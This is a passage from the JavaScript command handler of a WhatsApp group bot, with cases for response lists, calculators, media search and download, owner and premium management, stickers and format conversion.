let teks = `Halo @${m.sender.split("@")[0]} berikut beberapa list yang tersedia saat ini.\n\n`
for (let i of db_respon_list) {
if (i.id === m.chat) {
teks += `- ${i.key.toUpperCase()}\n`
}
}
teks += `\n\nUntuk melihat detail produk, silahkan kirim nama produk yang ada pada list di atas. Misalnya kamu ingin melihat detail produk dari ${db_respon_list[0].key.toUpperCase()}, maka kirim pesan ${db_respon_list[0].key.toUpperCase()} kepada bot`
XeonBotInc.sendMessage(m.chat, {text: teks, mentions: [m.sender]}, {quoted:m}) 
}
break
case 'dellist':
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins) return reply('Fitur Khusus admin!')
if (db_respon_list.length === 0) return reply(`Belum ada list message di database`)
if (!text) return reply(`Gunakan dengan cara ${prefix + command} *key*\n\n_Contoh_\n\n${prefix + command} hello`)
if (!isAlreadyResponList(m.chat, q.toLowerCase(), db_respon_list)) return reply(`List respon dengan key *${q}* tidak ada di database!`)
delResponList(m.chat, q.toLowerCase(), db_respon_list)
reply(`Sukses delete list message dengan key *${q}*`)
break
case'addlist':
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins) return reply('Fitur Khusus admin!')
var args1 = q.split("|")[0].toLowerCase()
var args2 = q.split("|")[1]
if (!q.includes("|")) return reply(`Gunakan dengan cara ${prefix+command} *key|response*\n\n_Contoh_\n\n${prefix+command} tes|apa`)
if (isAlreadyResponList(m.chat, args1, db_respon_list)) return reply(`List respon dengan key : *${args1}* sudah ada di group ini.`)
if (/image/.test(mime)) {
let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
const fd = new FormData();
fd.append('file', fs.readFileSync(media), '.tmp', '.jpg')
fetch('https://telegra.ph/upload', {
method: 'POST',
body: fd
}).then(res => res.json())
.then((json) => {
addResponList(m.chat, args1, args2, true, `https://telegra.ph${json[0].src}`, db_respon_list)
reply(`Sukses set list message dengan key : *${args1}*`)
if (fs.existsSync(media)) fs.unlinkSync(media)
})
} else {
addResponList(m.chat, args1, args2, false, '-', db_respon_list)
reply(`Sukses set list message dengan key : *${args1}*`)
}
break
case 'updatelist': case 'update':
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins) return reply('Fitur Khusus admin!')
var args1 = q.split("|")[0].toLowerCase()
var args2 = q.split("|")[1]
if (!q.includes("|")) return reply(`Gunakan dengan cara ${prefix+command} *key|response*\n\n_Contoh_\n\n${prefix+command} tes|apa`)
if (!isAlreadyResponListGroup(m.chat, db_respon_list)) return reply(`Maaf, untuk key *${args1}* belum terdaftar di group ini`)
if (/image/.test(mime)) {
let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
const fd = new FormData();
fd.append('file', fs.readFileSync(media), '.tmp', '.jpg')
fetch('https://telegra.ph/upload', {
method: 'POST',
body: fd
}).then(res => res.json())
.then((json) => {
updateResponList(m.chat, args1, args2, true, `https://telegra.ph${json[0].src}`, db_respon_list)
reply(`Sukses update respon list dengan key *${args1}*`)
if (fs.existsSync(media)) fs.unlinkSync(media)
})
} else {
updateResponList(m.chat, args1, args2, false, '-', db_respon_list)
reply(`Sukses update respon list dengan key *${args1}*`)
}
break
case 'tambah':{
if (!text.includes('+')) return reply(`Gunakan dengan cara ${prefix+command} *angka* + *angka*\n\n_Contoh_\n\n${prefix+command} 1+2`)
arg = args.join(' ')
atas = arg.split('+')[0]
bawah = arg.split('+')[1]
var nilai_one = Number(atas)
var nilai_two = Number(bawah)
reply(`${nilai_one + nilai_two}`)}
break
case 'kurang':{
if (!text.includes('-')) return reply(`Gunakan dengan cara ${prefix+command} *angka* - *angka*\n\n_Contoh_\n\n${prefix+command} 1-2`)
arg = args.join(' ')
atas = arg.split('-')[0]
bawah = arg.split('-')[1]
var nilai_one = Number(atas)
var nilai_two = Number(bawah)
reply(`${nilai_one - nilai_two}`)}
break
case 'kali':{
if (!text.includes('*')) return reply(`Gunakan dengan cara ${prefix+command} *angka* * *angka*\n\n_Contoh_\n\n${prefix+command} 1*2`)
arg = args.join(' ')
atas = arg.split('*')[0]
bawah = arg.split('*')[1]
var nilai_one = Number(atas)
var nilai_two = Number(bawah)
reply(`${nilai_one * nilai_two}`)}
break
case 'bagi':{
if (!text.includes('/')) return reply(`Gunakan dengan cara ${prefix+command} *angka* / *angka*\n\n_Contoh_\n\n${prefix+command} 1/2`)
arg = args.join(' ')
atas = arg.split('/')[0]
bawah = arg.split('/')[1]
var nilai_one = Number(atas)
var nilai_two = Number(bawah)
reply(`${nilai_one / nilai_two}`)}
break
case 'setproses': case 'setp':
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins) return reply('Fitur Khusus admin!')
if (!text) return reply(`Gunakan dengan cara ${prefix + command} *teks*\n\n_Contoh_\n\n${prefix + command} Pesanan sedang di proses ya @user\n\n- @user (tag org yg pesan)\n- @pesanan (pesanan)\n- @jam (waktu pemesanan)\n- @tanggal (tanggal pemesanan) `)
if (isSetProses(m.chat, set_proses)) return reply(`Set proses already active`)
addSetProses(text, m.chat, set_proses)
reply(`✅ Done set proses!`)
break
case 'changeproses': case 'changep':
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins) return reply('Fitur Khusus admin!')
if (!text) return reply(`Gunakan dengan cara ${prefix + command} *teks*\n\n_Contoh_\n\n${prefix + command} Pesanan sedang di proses ya @user\n\n- @user (tag org yg pesan)\n- @pesanan (pesanan)\n- @jam (waktu pemesanan)\n- @tanggal (tanggal pemesanan) `)
if (isSetProses(m.chat, set_proses)) {
changeSetProses(text, m.chat, set_proses)
reply(`Sukses ubah set proses!`)
} else {
addSetProses(text, m.chat, set_proses)
reply(`Sukses ubah set proses!`)
}
break
case 'delsetproses': case 'delsetp':
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins) return reply('Fitur Khusus admin!')
if (!isSetProses(m.chat, set_proses)) return reply(`Belum ada set proses di gc ini`)
removeSetProses(m.chat, set_proses)
reply(`Sukses delete set proses`)
break
case 'setdone':{
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins) return reply('Fitur Khusus admin!')
if (!text) return reply(`Gunakan dengan cara ${prefix + command} *teks*\n\n_Contoh_\n\n${prefix + command} Done @user\n\n- @user (tag org yg pesan)\n- @pesanan (pesanan)\n- @jam (waktu pemesanan)\n- @tanggal (tanggal pemesanan) `)
if (isSetDone(m.chat, set_done)) return reply(`Udh set done sebelumnya`)
addSetDone(text, m.chat, set_done)
reply(`Sukses set done!`)
break
}
case 'changedone': case 'changed':
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins) return reply('Fitur Khusus admin!')
if (!text) return reply(`Gunakan dengan cara ${prefix + command} *teks*\n\n_Contoh_\n\n${prefix + command} Done @user\n\n- @user (tag org yg pesan)\n- @pesanan (pesanan)\n- @jam (waktu pemesanan)\n- @tanggal (tanggal pemesanan) `)
if (isSetDone(m.chat, set_done)) {
changeSetDone(text, m.chat, set_done)
reply(`Sukses ubah set done!`)
} else {
addSetDone(text, m.chat, set_done)
reply(`Sukses ubah set done!`)
}
break
case 'delsetdone': case 'delsetd':
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins) return reply('Fitur Khusus admin!')
if (!isSetDone(m.chat, set_done)) return reply(`Belum ada set done di gc ini`)
removeSetDone(m.chat, set_done)
reply(`Sukses delete set done`)
break
//=========================================\\	
			case 'gimage': {
if (!text) return replygcxeon(`Example : ${prefix + command} carry minati`)
reply(mess.wait)
let gis = require('g-i-s')
gis(text, async (error, result) => {
n = result
images = n[Math.floor(Math.random() * n.length)].url
XeonBotInc.sendMessage(m.chat, { image: { url: images}, caption: `*-------「 GIMAGE SEARCH 」-------*\n🤠 *Query* : ${text}\n🔗 *Media Url* : ${images}`}, { quoted: m })
})
            }
            

        break
			case 'mediafire': {
	if (args.length == 0) return replygcxeon(`Dimana linknya?`)
	if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) return replygcxeon(`The link you provided is invalid`)
	const { mediafireDl } = require('./lib/mediafire.js')
	const baby1 = await mediafireDl(text)
	if (baby1[0].size.split('MB')[0] >= 10000) return replygcxeon('Oops, the file is too big...')
	const result4 = `*MEDIAFIRE DOWNLOADER*

*❖ Name* : ${baby1[0].nama}
*❖ Size* : ${baby1[0].size}
*❖ Mime* : ${baby1[0].mime}
*❖ Link* : ${baby1[0].link}`
replygcxeon(`${result4}`)
XeonBotInc.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : m })
}
break
case 'tiktokxx':{ 
if (!text) return replygcxeon( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return replygcxeon(`Link Invalid!!`)
reply(mess.wait)
require('./lib/tiktok').Tiktok(q).then( data => {
XeonBotInc.sendMessage(m.chat, { caption: `Ini dia!!`, video: { url: data.watermark }}, {quoted:m})
})
}
break
case 'tiktokaudioxx':{
if (!text) return replygcxeon( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return replygcxeon(`Link Invalid!!`)
reply(mess.wait)
require('./lib/tiktok').Tiktok(q).then( data => {
XeonBotInc.sendMessage(m.chat, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: m })
})
}
break
case 'google': {
if (!q) return replygcxeon(`Example : ${prefix + command} ${botname}`)
reply(mess.wait)
let google = require('google-it')
google({'query': text}).then(res => {
let teks = `Google Search From : ${text}\n\n`
for (let g of res) {
teks += `⭔ *Title* : ${g.title}\n`
teks += `⭔ *Description* : ${g.snippet}\n`
teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`
} 
replygcxeon(teks)
})
}
break
case 'happymod':{
if (!q) return replygcxeon(`Example ${prefix+command} Sufway surfer mod`)
reply(mess.wait)
let kat = await scp1.happymod(q)
replygcxeon(util.format(kat))
}
break
case 'search':
case 'yts': case 'ytsearch': {
if (!text) return replygcxeon(`Example : ${prefix + command} story wa anime`)
let yts = require("yt-search")
let search = await yts(text)
let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
let no = 1
for (let i of search.all) {
teks += `${themeemoji} No : ${no++}\n${themeemoji} Type : ${i.type}\n${themeemoji} Video ID : ${i.videoId}\n${themeemoji} Title : ${i.title}\n${themeemoji} Views : ${i.views}\n${themeemoji} Duration : ${i.timestamp}\n${themeemoji} Uploaded : ${i.ago}\n${themeemoji} Url : ${i.url}\n\n─────────────────\n\n`
}
XeonBotInc.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
            }
            break
case 'xxxxplay':{
if (!text) return replygcxeon(`Example : ${prefix+command} story wa anime`)
reply(mess.wait)
let search = await yts(text)
url = search.videos[0].url
let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
eek = await getBuffer(anu.thumbnail)
owned = `${ownernumber}@s.whatsapp.net`
ngen = `
Title : ${anu.title}
Ext : Search
ID : ${anu.videoId}
Viewers : ${anu.views}
Upload At : ${anu.ago}
Author : ${anu.author.name}
Channel : ${anu.author.url}
Link : ${anu.url}

Copy the link above and type the .ytmp3 link for audio and the .ytmp4 link for video`
XeonBotInc.sendMessage(m.chat, { image : eek, caption: ngen }, { quoted: m})
}
break
case 'play':  case 'song': {
if (!text) return replygcxeon(`Contoh : ${prefix + command} DJ Jawa Terbaru`)
reply(mess.wait)
const xeonplaymp3 = require('./lib/ytdl2')
let yts = require("youtube-yts")
        let search = await yts(text)
        let anup3k = search.videos[0]
const pl= await xeonplaymp3.mp3(anup3k.url)
await XeonBotInc.sendMessage(m.chat,{
    audio: fs.readFileSync(pl.path),
    fileName: anup3k.title + '.mp3',
    mimetype: 'audio/mp4', ptt: false,
    contextInfo:{
        externalAdReply:{
            title:anup3k.title,
            body: botname,
            thumbnail: await fetchBuffer(pl.meta.image),
            mediaType:2,
            mediaUrl:anup3k.url,
        }

    },
},{quoted:m})
await fs.unlinkSync(pl.path)
}
break
case "ytmp3": case "ytaudio": //credit: Ray Senpai â¤ï¸ https://github.com/EternityBots/Nezuko
reply(mess.wait)
const xeonaudp3 = require('./lib/ytdl2')
if (args.length < 1 || !isUrl(text) || !xeonaudp3.isYTUrl(text)) return replygcxeon(`Mana Link Nya Sayang🗿\nContoh: ${prefix + command} https://youtube.com/shorts/YQf-vMjDuKY?feature=share`)
const audio=await xeonaudp3.mp3(text)
await XeonBotInc.sendMessage(m.chat,{
    audio: fs.readFileSync(audio.path),
    mimetype: 'audio/mp4', ptt: false,
    contextInfo:{
        externalAdReply:{
            title:audio.meta.title,
            body: botname,
            thumbnail: await fetchBuffer(audio.meta.image),
            mediaType:2,
            mediaUrl:text,
        }

    },
},{quoted:m})
await fs.unlinkSync(audio.path)
break
case 'ytmp4': case 'ytvideo': {
reply(mess.wait)
const xeonvidoh = require('./lib/ytdl2')
if (args.length < 1 || !isUrl(text) || !xeonvidoh.isYTUrl(text)) replygcxeon(`Where is the link??\n\nExample : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`)
const vid=await xeonvidoh.mp4(text)
const ytc=`
*${themeemoji}Judul:* ${vid.title}
*${themeemoji}Data:* ${vid.date}
*${themeemoji}Durasi:* ${vid.duration}
*${themeemoji}Kualitas:* ${vid.quality}`
await XeonBotInc.sendMessage(m.chat,{
    video: {url:vid.videoUrl},
    caption: ytc
},{quoted:m})
}
break
case 'ytvxxx': case 'ytmp4xxx': case 'mp4xxx':{
if (!text) return replygcxeon('Enter the link!!!')
reply(mess.wait)
downloadMp4(text)
}
break
case 'ytaxxx': case 'ytmp3xxx': case 'mp3xxx':{
if (!text) return replygcxeon('Enter the link!!!')
reply(mess.wait)
downloadMp3(text)
}
break  
case 'getcase':
if (!XeonTheCreator) return XeonStickOwner()
const getCase = (cases) => {
return "case"+`'${cases}'`+fs.readFileSync("XeonCheems8.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"
}
replygcxeon(`${getCase(q)}`)
break
//=========================================\\
	case 'addprem':
if (!XeonTheCreator) return XeonStickOwner()
if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await XeonBotInc.onWhatsApp(prrkek)
if (ceknya.length == 0) return replygcxeon(`Enter a valid and registered number on WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
replygcxeon(`The Number ${prrkek} Has Been Premium!`)
break
//=========================================\\
case 'delprem':
if (!XeonTheCreator) return XeonStickOwner()
if (!args[0]) return replygcxeon(`Use ${prefix+command} nomor\nExample ${prefix+command} 916909137213`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
replygcxeon(`The Number ${ya} Has Been Removed Premium!`)
break
case 'addbadword':{
if (!XeonTheCreator) return XeonStickOwner()
if (args.length < 1) return replygcxeon('Whats the word?')
if (BadXeon.includes(q)) return replygcxeon("The word is already in use")
BadXeon.push(q)
fs.writeFileSync('./database/bad.json', JSON.stringify(BadXeon))
replygcxeon(`Success Adding Bad Word\nCheck by typing ${prefix}listbadword`)
}
break
case 'delbadword':{
if (!XeonTheCreator) return XeonStickOwner()
if (args.length < 1) return replygcxeon('Enter the word')
if (!BadXeon.includes(q)) return replygcxeon("The word does not exist in the database")
let wanu = BadXeon.indexOf(q)
BadXeon.splice(wanu, 1)
fs.writeFileSync('./database/bad.json', JSON.stringify(BadXeon))
replygcxeon(`Success deleting bad word ${q}`)
}
break
case 'listbadword':{
let teks = '┌──⭓「 *BadWord List* 」\n│\n'
for (let x of BadXeon) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${BadXeon.length}*`
replygcxeon(teks)
}
break
case 'addvideo':{
if (!XeonTheCreator) return XeonStickOwner()
if (args.length < 1) return replygcxeon('Whats the video name?')
if (VideoXeon.includes(q)) return replygcxeon("The name is already in use")
let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
VideoXeon.push(q)
await fsx.copy(delb, `./YaeMedia/video/${q}.mp4`)
fs.writeFileSync('./YaeMedia/database/xeonvideo.json', JSON.stringify(VideoXeon))
fs.unlinkSync(delb)
replygcxeon(`Success Adding Video\nCheck by typing ${prefix}listvideo`)
}
break
case 'delvideo':{
if (!XeonTheCreator) return XeonStickOwner()
if (args.length < 1) return replygcxeon('Enter the video name')
if (!VideoXeon.includes(q)) return replygcxeon("The name does not exist in the database")
let wanu = VideoXeon.indexOf(q)
VideoXeon.splice(wanu, 1)
fs.writeFileSync('./YaeMedia/database/xeonvideo.json', JSON.stringify(VideoXeon))
fs.unlinkSync(`./YaeMedia/video/${q}.mp4`)
replygcxeon(`Success deleting video ${q}`)
}
break
case 'listvideo':{
let teks = '┌──⭓「 *Video List* 」\n│\n'
for (let x of VideoXeon) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${VideoXeon.length}*`
replygcxeon(teks)
}
break
case 'addimage':{
if (!XeonTheCreator) return XeonStickOwner()
if (args.length < 1) return replygcxeon('Whats the image name?')
if (ImageXeon.includes(q)) return replygcxeon("The name is already in use")
let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
ImageXeon.push(q)
await fsx.copy(delb, `./YaeMedia/image/${q}.jpg`)
fs.writeFileSync('./YaeMedia/database/xeonimage.json', JSON.stringify(ImageXeon))
fs.unlinkSync(delb)
replygcxeon(`Success Adding Image\nCheck by typing ${prefix}listimage`)
}
break
case 'delimage':{
if (!XeonTheCreator) return XeonStickOwner()
if (args.length < 1) return replygcxeon('Enter the image name')
if (!ImageXeon.includes(q)) return replygcxeon("The name does not exist in the database")
let wanu = ImageXeon.indexOf(q)
ImageXeon.splice(wanu, 1)
fs.writeFileSync('./YaeMedia/database/xeonimage.json', JSON.stringify(ImageXeon))
fs.unlinkSync(`./YaeMedia/image/${q}.jpg`)
replygcxeon(`Success deleting image ${q}`)
}
break
case 'listimage':{
let teks = '┌──⭓「 *Image List* 」\n│\n'
for (let x of ImageXeon) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${ImageXeon.length}*`
replygcxeon(teks)
}
break
case 'addsticker':{
if (!XeonTheCreator) return XeonStickOwner()
if (args.length < 1) return replygcxeon('Whats the sticker name?')
if (StickerXeon.includes(q)) return replygcxeon("The name is already in use")
let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
StickerXeon.push(q)
await fsx.copy(delb, `./YaeMedia/sticker/${q}.webp`)
fs.writeFileSync('./YaeMedia/database/xeonsticker.json', JSON.stringify(StickerXeon))
fs.unlinkSync(delb)
replygcxeon(`Success Adding Sticker\nCheck by typing ${prefix}liststicker`)
}
break
case 'delsticker':{
if (!XeonTheCreator) return XeonStickOwner()
if (args.length < 1) return replygcxeon('Enter the sticker name')
if (!StickerXeon.includes(q)) return replygcxeon("The name does not exist in the database")
let wanu = StickerXeon.indexOf(q)
StickerXeon.splice(wanu, 1)
fs.writeFileSync('./YaeMedia/database/xeonsticker.json', JSON.stringify(StickerXeon))
fs.unlinkSync(`./YaeMedia/sticker/${q}.webp`)
replygcxeon(`Success deleting sticker ${q}`)
}
break
case 'liststicker':{
let teks = '┌──⭓「 *Sticker List* 」\n│\n'
for (let x of StickerXeon) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${StickerXeon.length}*`
replygcxeon(teks)
}
break
case 'addvn':{
if (!XeonTheCreator) return XeonStickOwner()
if (args.length < 1) return replygcxeon('Whats the audio name?')
if (VoiceNoteXeon.includes(q)) return replygcxeon("The name is already in use")
let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
VoiceNoteXeon.push(q)
await fsx.copy(delb, `./YaeMedia/audio/${q}.mp3`)
fs.writeFileSync('./YaeMedia/database/xeonvn.json', JSON.stringify(VoiceNoteXeon))
fs.unlinkSync(delb)
replygcxeon(`Success Adding Audio\nCheck by typing ${prefix}listvn`)
}
break
case 'delvn':{
if (!XeonTheCreator) return XeonStickOwner()
if (args.length < 1) return replygcxeon('Enter the vn name')
if (!VoiceNoteXeon.includes(q)) return replygcxeon("The name does not exist in the database")
let wanu = VoiceNoteXeon.indexOf(q)
VoiceNoteXeon.splice(wanu, 1)
fs.writeFileSync('./YaeMedia/database/xeonvn.json', JSON.stringify(VoiceNoteXeon))
fs.unlinkSync(`./YaeMedia/audio/${q}.mp3`)
replygcxeon(`Success deleting vn ${q}`)
}
break
case 'listvn':{
let teks = '┌──⭓「 *VN List* 」\n│\n'
for (let x of VoiceNoteXeon) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${VoiceNoteXeon.length}*`
replygcxeon(teks)
}
break
case 'addowner':
if (!XeonTheCreator) return XeonStickOwner()
if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} ${ownernumber}`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await XeonBotInc.onWhatsApp(bnnd)
if (ceknye.length == 0) return replygcxeon(`Enter A Valid And Registered Number On WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
replygcxeon(`Number ${bnnd} Has Become An Owner!!!`)
break
case 'delowner':
if (!XeonTheCreator) return XeonStickOwner()
if (!args[0]) return replygcxeon(`Use ${prefix+command} nomor\nExample ${prefix+command} 916909137213`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
replygcxeon(`The Numbrr ${ya} Has been deleted from owner list by the owner!!!`)
break
case 'listpremium': case 'listprem':
teks = '*Premium List*\n\n'
for (let XeonBotInc of prem) {
teks += `- ${XeonBotInc}\n`
}
teks += `\n*Total : ${prem.length}*`
XeonBotInc.sendMessage(m.chat, { text: teks.trim() }, 'extendedTextMessage', { quoted: m, contextInfo: { "mentionedJid": prem } })
break
case 'setcmd': {
if (!m.quoted) return replygcxeon('Reply Message!')
if (!m.quoted.fileSha256) return replygcxeon('SHA256 Hash Missing')
if (!text) return replygcxeon(`For What Command?`)
let hash = m.quoted.fileSha256.toString('base64')
if (global.db.sticker[hash] && global.db.sticker[hash].locked) return replygcxeon('You have no permission to change this sticker command')
global.db.sticker[hash] = {
text,
mentionedJid: m.mentionedJid,
creator: m.sender,
at: + new Date,
locked: false,
}
replygcxeon(`Done!`)
            }
            break
case 'delcmd': {
let hash = m.quoted.fileSha256.toString('base64')
if (!hash) return replygcxeon(`No hashes`)
if (global.db.sticker[hash] && global.db.sticker[hash].locked) return replygcxeon('You have no permission to delete this sticker command')             
delete global.db.sticker[hash]
replygcxeon(`Done!`)
            }
            break
case 'listcmd': {
let teks = `
*List Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
XeonBotInc.sendText(m.chat, teks, m, { mentions: Object.values(global.db.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
            }
            break 
case 'lockcmd': {
if (!XeonTheCreator) return XeonStickOwner()
if (!m.quoted) return replygcxeon('Reply Message!')
if (!m.quoted.fileSha256) return replygcxeon('SHA256 Hash Missing')
let hash = m.quoted.fileSha256.toString('base64')
if (!(hash in global.db.sticker)) return replygcxeon('Hash not found in database')
global.db.sticker[hash].locked = !/^un/i.test(command)
replygcxeon('Done!')
            }
            break
case 'addmsg': {
if (!m.quoted) return replygcxeon('Reply Message You Want To Save In Database')
if (!text) return replygcxeon(`Example : ${prefix + command} filename`)
let msgs = global.db.database
if (text.toLowerCase() in msgs) return replygcxeon(`'${text}' registered in the message list`)
msgs[text.toLowerCase()] = quoted.fakeObj
replygcxeon(`Successfully added message in message list as '${text}'
    
Access with ${prefix}getmsg ${text}

View list of Messages With ${prefix}listmsg`)
            }
            break
case 'getmsg': {
if (!text) return replygcxeon(`Example : ${prefix + command} file name\n\nView list of messages with ${prefix}listmsg`)
let msgs = global.db.database
if (!(text.toLowerCase() in msgs)) return replygcxeon(`'${text}' not listed in the message list`)
XeonBotInc.copyNForward(m.chat, msgs[text.toLowerCase()], true)
            }
            break
case 'listmsg': {
let msgs = JSON.parse(fs.readFileSync('./database/database.json'))
	        let seplit = Object.entries(global.db.database).map(([nama, isi]) => { return { nama, ...isi } })
		let teks = ' DATABASE LIST \n\n'
		for (let i of seplit) {
		    teks += `${themeemoji} *Name :* ${i.nama}\n${themeemoji} *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
	        }
	        replygcxeon(teks)
	    }
	    break
	case 'delmsg': case 'deletemsg': {
	        let msgs = global.db.database
	        if (!(text.toLowerCase() in msgs)) return replygcxeon(`'${text}' not listed in the message list`)
		delete msgs[text.toLowerCase()]
		replygcxeon(`Successfully deleted '${text}' from the message list`)
            }
	    break
case 'setexif': {
               if (!XeonTheCreator) return XeonStickOwner()
               if (!text) return replygcxeon(`Example : ${prefix + command} packname|author`)
          global.packname = text.split("|")[0]
          global.author = text.split("|")[1]
          replygcxeon(`Exif has been successfully changed to\n\n${themeemoji} Packname : ${global.packname}\n${themeemoji} Author : ${global.author}`)
            }
            break
case 'getbio':{
              try {
    let who
    if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender
    else who = m.quoted.sender ? m.quoted.sender : m.sender
    let bio = await XeonBotInc.fetchStatus(who)
    replygcxeon(bio.status)
  } catch {
    if (text) return replygcxeon(`bio is private or you haven't replied to the person's message!`)
    else try {
      let who = m.quoted ? m.quoted.sender : m.sender
      let bio = await XeonBotInc.fetchStatus(who)
      replygcxeon(bio.status)
    } catch {
      return replygcxeon(`bio is private or you haven't replied to the person's message!`)
    }
  }
}
break
case 'setppbot': case 'setbotpp': {
if (!XeonTheCreator) return XeonStickOwner()
if (!quoted) return replygcxeon(`Send/Reply Image With Caption ${prefix + command}`)
if (!/image/.test(mime)) return replygcxeon(`Send/Reply Image With Caption ${prefix + command}`)
if (/webp/.test(mime)) return replygcxeon(`Send/Reply Image With Caption ${prefix + command}`)
var medis = await XeonBotInc.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (args[0] == `full`) {
var { img } = await generateProfilePicture(medis)
await XeonBotInc.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(medis)
replygcxeon(`Success`)
} else {
var memeg = await XeonBotInc.updateProfilePicture(botNumber, { url: medis })
fs.unlinkSync(medis)
replygcxeon(`Success`)
}
}
break
case 'creategc': case 'creategroup': {
if (!XeonTheCreator) return XeonStickOwner()
if (!args.join(" ")) return replygcxeon(`Use ${prefix+command} groupname`)
try {
let cret = await XeonBotInc.groupCreate(args.join(" "), [])
let response = await XeonBotInc.groupInviteCode(cret.id)
teks = `     「 Create Group 」

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}

https://chat.whatsapp.com/${response}
       `
XeonBotInc.sendMessage(m.chat, { text:teks, mentions: await XeonBotInc.parseMention(teks)}, {quoted:m})
} catch {
replygcxeon("Error!")
}
}
break
case 'cry': case 'kill': case 'hug': case 'pat': case 'lick': 
case 'kiss': case 'bite': case 'yeet': case 'bully': case 'bonk':
case 'wink': case 'poke': case 'nom': case 'slap': case 'smile': 
case 'wave': case 'awoo': case 'blush': case 'smug': case 'glomp': 
case 'happy': case 'dance': case 'cringe': case 'cuddle': case 'highfive': 
case 'shinobu': case 'handhold': {

axios.get(`https://api.waifu.pics/sfw/${command}`)
.then(({data}) => {
XeonBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'woof':
case '8ball':
case 'goose':
case 'gecg':
case 'feed':
case 'avatar':
case 'fox_girl':
case 'lizard':
case 'spank':
case 'meow':
case 'tickle':{
axios.get(`https://nekos.life/api/v2/img/${command}`)
.then(({data}) => {
XeonBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'tomp4': case 'tovideo': {
if (!quoted) return replygcxeon('Reply to Sticker')
if (!/webp/.test(mime)) return replygcxeon(`reply sticker with caption *${prefix + command}*`)
reply(mess.wait)
		        let { webp2mp4File } = require('./lib/uploader')
let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await XeonBotInc.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
await fs.unlinkSync(media)
            }
            break
            case 'toaud': case 'tomp3': case 'toaudio': {
            if (!/video/.test(mime) && !/audio/.test(mime)) return replygcxeon(`Send/Reply Video/Audio You Want to Use as Audio With Caption ${prefix + command}`)
            if (!quoted) return replygcxeon(`Send/Reply Video/Audio You Want to Use as Audio With Caption ${prefix + command}`)
            reply(mess.wait)
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            XeonBotInc.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
            }
            break
            
            case 'tovn': case 'toptt': {
            if (!/video/.test(mime) && !/audio/.test(mime)) return replygcxeon(`Reply Video/Audio That You Want To Be VN With Caption ${prefix + command}`)
            if (!quoted) return replygcxeon(`Reply Video/Audio That You Want To Be VN With Caption ${prefix + command}`)
            reply(mess.wait)
